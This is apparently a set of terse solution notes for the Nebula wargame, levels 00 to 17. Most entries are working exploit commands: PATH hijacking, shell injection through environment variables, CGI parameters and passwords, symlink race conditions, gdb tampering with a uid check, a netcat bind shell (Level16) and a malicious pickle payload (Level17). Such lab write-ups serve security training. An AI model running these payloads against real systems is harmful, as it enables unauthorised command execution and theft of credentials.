Level00:
--------------------------
find / -user flag01 -type f
next level pass: KmuHcCMN

Level01:
--------------------------
in ~/:  
test.c:
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
system("/bin/cat password");
}

gcc -o echo test.c
PATH=/home/level01
/usr/bin/env echo fdasfsd
cd /home/flag01/
./flag01  

next level pass: HVCe3iUg

Level02:
--------------------------
USER="levelx; cat /home/flag02/password"
/home/flag02/flag02

next level pass: ny0JJdYo


Level03:
--------------------------
cd /home/flag03/writable.d/
touch scr
vim scr
  #!/bin/bash
  getflag
  cat /home/flag03/password > /tmp/mp
chmod +x scr

next level pass: X9m6DVW1

Level04:
--------------------------
ln -s /home/flag04/token /tmp/tk
./flag04 /tmp/tk

next level pass: AzQQJxkI

Level05:
--------------------------
cd /home/flag05
cd .backup
cp backup-19072011.tgz ~/
cd ~/
tar xvf backup-19072011.tgz
ssh flag05@localhost
cat /home/flag05/password

next level pass: ybu8G9D3

Level06:
----------------
cat /etc/passwd
echo flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh > passwd
john.exe passwd
flag06 password: hello 

next level pass: 4BmdV8HX
  
Level07:
----------------
cd /home/flag07
thttpd -C thttpd.conf
wget -O - http://localhost:7007/inex.cgi?Host="localhost;getflag"
http://nebula:7007/index.cgi?Host=%3bcat%20password
  
next level pass: V33ZbEoF 

Level08:
----------------
from pcap: Password: backdoor[DEL][DEL][DEL]00Rm8[DEL]ate
==>flag08 password: backd00Rmate

next level pass: BSfL8dMg

Level09:
----------------
/home/flag09/flag09 password

/tmp/scr:
    [email {${system($filename)}}]
    cat /home/flag09/password
    echo "liviu was here" >> /home/flag09/hall_of_fame
    cat /home/flag09/hall_of_fame

chmod +x /tmp/scr

/home/flag09/flag09 /tmp/scr

next level pass: t8JzLEZl

Level10:
----------------
Trigger race condition:
touch /tmp/test
./flag10 /tmp/test 10.215.10.77 &
(/tmp/test is readable ==> bypass access check. Wait forconnect timeout)
rm /tmp/test; ln -sf /home/flag10/password /tmp/test
(replace link and start listener)
WIN: nc -l -p 18211

next level pass: UJhv5Wds

Level11:
----------------
/home/level11/gen.py 
Script to generate initial encoded buffer, 
to be decoded into a valid command.

python gen.py | TEMP=/tmp /home/flag11/flag11
cat /home/flag11/out
You have successfully executed getflag on a target account

next level pass: 4RmWT7Dz

Level12:
----------------
telnet 127.0.0.1 50001
Password: `getflag > /tmp/flag12` 
Command passed as password gets evaluated by popen()

next level pass: 6yXhk4cu

Level13:
----------------
cd ~/
gdb /home/flag13/flag13
(gdb) set logging on
(gdb) disas main
Dump of assembler code for function main:
  [ . . .]   
  0x080484ed <+41>:	xor    %eax,%eax
  0x080484ef <+43>:	call   0x80483c0 <getuid@plt> // call to getuit()
  0x080484f4 <+48>:	cmp    $0x3e8,%eax  // comparison
Quit
(gdb) break *080484f4
Breakpoint 1 at 0x80484f4
(gdb) run
Breakpoint 1, 0x080484f4 in main ()
(gdb) p $eax
$1 = 1014
(gdb) set $eax=1000
(gdb) c
Continuing.
Your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 2114) exited with code 063]

next level pass: 3JNcCWvD

Level14:
----------------
$cd /home/flag14
$./flag14 -e
Simple encrytion with incrementing key. 
abc -> ace and so on ...
'Decrypt' with dec.py:
$cd ~
$python dec.py `cat /home/flag14/token`
8457c118-887c-4e40-a5a6-33a25353165

next level pass: NeZMmlui

Level15:
----------------
./strace /home/flag15/flag15
http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html

[...]
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
[...]
Create a fake library in the path above, where the program searches for libraries,

Function used:
gdb /home/flag15/flag15
(gdb) disas main
. . .
0x08048340 <+16>:    call   0x8048300 <puts@plt>
. . .

To get access to system()  function, link in libc’s static library (-Bstatic, -static).

$ make -f Makefile all
$ strace /home/flag15/flag15 2> out_strace

next level pass: 574YGIzG

Level16:
----------------
http://thisisdearmo.blogspot.ro/2012/06/nebula-level-16-solution.html
Script should be placed in /tmp folder, so that flag16 user (the owner of thttpd process) can access it.
/tmp/SCRIPT:
#!/bin/sh
nc.traditional -lvn 4444 -e /bin/sh

nc nebula 1616
GET /index.cgi?username="`/*/SCRIPT`%00"&password=pass

>nc 192.168.0.18 4444
id
uid=983(flag16) gid=983(flag16) groups=983(flag16)
getflag
You have successfully executed getflag on a target account

next level pass: 

Level 17
---------------------------
http://nadiana.com/python-pickle-insecure
http://docs.python.org/library/pickle.html
"Warning The pickle module is not intended to be secure against erroneous or 
maliciously constructed data. Never unpickle data received from an untrusted 
or unauthenticated source."

Method1:
~/pickled:
cos
system
(S'getflag > /tmp/out2'
tR.

$ cat pickled | nc localhost 10007
Accepted connection from 127.0.0.1:53001
^C
level17@nebula:~$ cat /tmp/out2
You have successfully executed getflag on a target account

Method2:
Create an object that, when unpickled, will run a specified command, 
in it's __reduce__() function. The print it's pickled representation and feed 
it to the script running on 10007.
(more on this: http://blog.nelhage.com/2011/03/exploiting-pickle/)

python exploit.py  | nc 127.0.0.1 10007
Accepted connection from 127.0.0.1:53002
^C
level17@nebula:~$ cat /tmp/out_exp
You have successfully executed getflag on a target account

next level pass: 

Level 18
---------------------------


--------
It shall be done.
Ghost reportin'
Jacked up and good to go
Good day, commander.